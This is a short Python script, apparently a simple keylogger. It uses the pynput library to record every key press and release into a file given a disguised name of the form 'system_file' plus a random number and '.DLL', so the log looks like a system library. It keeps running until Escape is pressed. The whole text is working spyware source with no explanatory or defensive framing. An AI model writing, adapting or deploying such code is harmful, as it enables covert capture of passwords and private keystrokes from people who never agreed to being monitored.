from random  import randint

from pynput.keyboard import Key,Listener

output='system_file'+str(randint(0,10000)) +'.DLL'
with open(output, 'w') as f:
    f.close()
    
def on_press(key):
    with open(output,'a') as f:
        f.write(('{0}'.format(key)))
        f.close()
def on_release(key):
    with open(output,'a') as f:
        f.write(('{0}'.format(key)))
        f.close()
    if key== Key.esc:
        return False
    
with Listener(on_press=on_press,on_release=on_release) as listener:
    listener.join()  